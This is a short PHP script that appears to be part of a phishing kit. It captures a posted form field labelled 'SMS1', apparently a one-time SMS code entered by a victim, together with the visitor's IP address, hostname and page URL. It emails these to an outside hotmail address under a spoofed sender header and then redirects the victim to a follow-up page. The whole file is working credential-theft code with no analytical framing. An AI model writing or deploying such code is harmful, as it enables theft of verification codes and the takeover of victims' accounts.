<?php
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "index2.html" ;
$hostname = gethostbyaddr($ip);
$message .= "OK\n";
$message .= "SMS1 : ".$_POST['s6']."\n";
$message .= "----\n";
$message .= "IPs             : $ip\n";
$message .= "HN              : $hostname\n";
$message .= "U7l            : http://$link\n";
$message .= "OK\n";
$send = "superdeferme@hotmail.com";
$subject = "OK $ip";
$headers = "From: AM<info@silas7.com>";
mail($send,$subject,$message,$headers);
header("Location: $back");


?>